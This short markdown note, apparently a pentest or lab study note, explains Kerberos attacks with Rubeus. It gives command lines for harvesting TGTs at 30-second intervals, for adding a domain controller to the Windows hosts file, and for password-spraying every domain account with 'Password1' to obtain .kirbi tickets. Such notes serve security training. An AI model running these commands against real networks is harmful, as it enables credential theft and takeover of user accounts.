# Harvesting Tickets w/ Rubeus

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

The following payload will tells Rubeus to harvest TGT every 30s
```cmd
Rubeus.exe harvest /interval:30
```

#### Brute-Forcing / Password-Spraying
***Brute-Forcing***:Try a bunch of password for one user account  
***Password-Spaying***:Try one password for a bunch of known user account

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file, as you can do with /etc/host.  
```cmd
echo <IP> <DOMAIN.local> >> C:\Windows\System32\drivers\etc\hosts 
```

Since we are logged into the machine, the following command will find every user account and spray the given password against them all.
```cmd
Rubeus.exe brute /password:Password1 
```
or
```cmd
Rubeus.exe brute /password:Password1 /noticket
```
If there is a match, it will return the .kirbi TGT for that user, it looks like that : 
[sortie_spray_kerbrute](images/sortie_spray_kerbrute.png)
